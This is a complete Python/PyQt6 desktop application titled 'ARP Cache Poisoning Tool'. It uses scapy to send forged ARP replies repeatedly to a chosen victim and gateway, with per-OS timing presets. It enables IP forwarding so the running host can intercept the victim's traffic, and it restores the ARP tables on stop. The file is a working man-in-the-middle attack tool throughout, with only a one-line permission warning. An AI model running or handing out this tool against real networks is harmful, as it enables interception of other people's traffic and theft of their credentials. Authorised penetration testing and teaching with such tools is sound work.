import sys
import os
import time
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QComboBox, QGroupBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from scapy.all import ARP, sr1, send

def is_admin():
    """Check if running with root privileges on Linux"""
    return os.geteuid() == 0


def get_mac(ip):
    """Get MAC address for given IP"""
    ans = sr1(ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans.hwsrc
    else:
        return None


def spoof(victim_ip, victim_mac, spoof_ip):
    """Send spoofed ARP packet"""
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    return True


def restore(dest_ip, dest_mac, src_ip, src_mac):
    """Restore ARP table entry"""
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                  psrc=src_ip, hwsrc=src_mac)
    send(packet, count=5, verbose=False)


def enable_ip_forwarding():
    """Enable IP forwarding on Linux and return original state"""
    original_state = None
    
    try:
        # Read current state
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            original_state = f.read().strip()
        # Enable forwarding
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    except Exception as e:
        print(f"Error enabling IP forwarding: {e}")
    
    return original_state


def disable_ip_forwarding(original_state):
    """Restore IP forwarding to original state on Linux"""
    try:
        if original_state is not None:
            os.system(f'echo {original_state} > /proc/sys/net/ipv4/ip_forward')
    except Exception as e:
        print(f"Error disabling IP forwarding: {e}")


class ARPWorker(QThread):
    log = pyqtSignal(str)

    def __init__(self, victim_ip: str, gateway_ip: str, interval: float = 2.0):
        super().__init__()
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self._running = True
        
        # Cache MAC addresses
        self.victim_mac = None
        self.gateway_mac = None

    def run(self):
        self.log.emit(f"Worker started: victim={self.victim_ip}, gateway={self.gateway_ip}")
        self.log.emit(f"Spoofing interval: {self.interval}s")
        
        # Resolve and cache MAC addresses once
        self.log.emit("Resolving MAC addresses...")
        self.victim_mac = get_mac(self.victim_ip)
        self.gateway_mac = get_mac(self.gateway_ip)
        
        if self.victim_mac is None:
            self.log.emit(f"ERROR: Could not resolve MAC for victim {self.victim_ip}")
            return
        if self.gateway_mac is None:
            self.log.emit(f"ERROR: Could not resolve MAC for gateway {self.gateway_ip}")
            return
            
        self.log.emit(f"Victim MAC: {self.victim_mac}")
        self.log.emit(f"Gateway MAC: {self.gateway_mac}")
        self.log.emit("Starting ARP poisoning...")
        
        try:
            packet_count = 0
            while self._running:
                spoof(self.victim_ip, self.victim_mac, self.gateway_ip)
                spoof(self.gateway_ip, self.gateway_mac, self.victim_ip)
                packet_count += 2
                
                if packet_count % 20 == 0:  # Log every 10 cycles
                    self.log.emit(f"Packets sent: {packet_count}")
                
                time.sleep(self.interval)
        except Exception as e:
            self.log.emit(f"Worker error: {e}")
        finally:
            try:
                self.log.emit("Restoring ARP tables...")
                restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
                restore(self.gateway_ip, self.gateway_mac, self.victim_ip, self.victim_mac)
                self.log.emit("ARP tables restored successfully")
            except Exception as e:
                self.log.emit(f"Error while restoring: {e}")

    def stop(self):
        """Signal the worker to stop"""
        self._running = False


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ARP Cache Poisoning Tool")
        self.setMinimumSize(600, 500)
        self.worker = None
        self.ip_forward_original_state = None

        central = QWidget()
        layout = QVBoxLayout(central)
        self.setCentralWidget(central)

        # Configuration group
        config_group = QGroupBox("Configuration")
        config_layout = QVBoxLayout()

        # Victim IP
        row1 = QHBoxLayout()
        row1.addWidget(QLabel("Victim IP:"))
        self.victim_ip_input = QLineEdit()
        self.victim_ip_input.setPlaceholderText("e.g., 192.168.1.100")
        row1.addWidget(self.victim_ip_input)
        config_layout.addLayout(row1)

        # Gateway IP
        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Gateway IP:"))
        self.gateway_ip_input = QLineEdit()
        self.gateway_ip_input.setPlaceholderText("e.g., 192.168.1.1")
        row2.addWidget(self.gateway_ip_input)
        config_layout.addLayout(row2)

        # OS Selection for ARP timing
        row3 = QHBoxLayout()
        row3.addWidget(QLabel("Target OS:"))
        self.os_combo = QComboBox()
        self.os_combo.addItem("Windows (60s cache)", 30.0)  # Send every 30s for 60s cache
        self.os_combo.addItem("macOS (20min cache)", 120.0)  # Send every 2min for 20min cache
        self.os_combo.addItem("Linux (60s cache)", 30.0)  # Send every 30s for 60s cache
        self.os_combo.addItem("Custom/Aggressive (2s)", 2.0)  # Original aggressive timing
        self.os_combo.setCurrentIndex(3)  # Default to aggressive
        row3.addWidget(self.os_combo)
        config_layout.addLayout(row3)

        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

        # Control buttons
        btn_row = QHBoxLayout()
        self.start_button = QPushButton("Begin Poisoning")
        self.start_button.clicked.connect(self.start_poisoning)
        self.start_button.setStyleSheet("QPushButton { background-color: #4CAF50; color: white; font-weight: bold; padding: 8px; }")
        btn_row.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop Poisoning")
        self.stop_button.clicked.connect(self.stop_poisoning)
        self.stop_button.setEnabled(False)
        self.stop_button.setStyleSheet("QPushButton { background-color: #f44336; color: white; font-weight: bold; padding: 8px; }")
        btn_row.addWidget(self.stop_button)

        layout.addLayout(btn_row)

        # Output log
        layout.addWidget(QLabel("Output:"))
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        # Initial warning
        self.print_output("=== ARP Cache Poisoning Tool ===")
        self.print_output("WARNING: Use only on networks you own or have explicit permission to test.")
        self.print_output("Linux-only tool - requires root privileges")
        if not is_admin():
            self.print_output("WARNING: Not running as root. Tool will fail to send packets.")

    def start_poisoning(self):
        victim_ip = self.victim_ip_input.text().strip()
        gateway_ip = self.gateway_ip_input.text().strip()
        
        if not is_admin():
            self.print_output("ERROR: Tool needs to run as root/admin.")
            return
        
        if not victim_ip or not gateway_ip:
            self.print_output("ERROR: Please enter both Victim IP and Gateway IP.")
            return
        
        if self.worker is not None and self.worker.isRunning():
            self.print_output("ERROR: Poisoning already running")
            return

        # Get selected interval
        interval = self.os_combo.currentData()
        
        # Enable IP forwarding
        self.print_output("Enabling IP forwarding...")
        self.ip_forward_original_state = enable_ip_forwarding()
        
        # Create and start worker
        self.worker = ARPWorker(victim_ip, gateway_ip, interval)
        self.worker.log.connect(self.print_output)
        
        # Disable inputs
        self.victim_ip_input.setEnabled(False)
        self.gateway_ip_input.setEnabled(False)
        self.os_combo.setEnabled(False)
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        
        self.print_output(f"Starting poisoning: victim={victim_ip}, gateway={gateway_ip}")
        self.worker.start()

    def stop_poisoning(self):
        if self.worker is None:
            self.print_output("ERROR: Poisoning not running")
            return

        self.print_output("Stopping poisoning...")
        try:
            self.worker.stop()
            self.worker.wait(5000)
        except Exception as e:
            self.print_output(f"Error stopping worker: {e}")
        finally:
            # Restore IP forwarding
            self.print_output("Restoring IP forwarding state...")
            disable_ip_forwarding(self.ip_forward_original_state)
            self.ip_forward_original_state = None
            
            self.worker = None
            self.victim_ip_input.setEnabled(True)
            self.gateway_ip_input.setEnabled(True)
            self.os_combo.setEnabled(True)
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.print_output("Poisoning stopped and IP forwarding restored")

    def print_output(self, message):
        self.output.append(message)

    def closeEvent(self, event):
        """Ensure clean shutdown if window is closed during poisoning"""
        if self.worker is not None and self.worker.isRunning():
            self.print_output("Window closing - stopping poisoning...")
            self.stop_poisoning()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())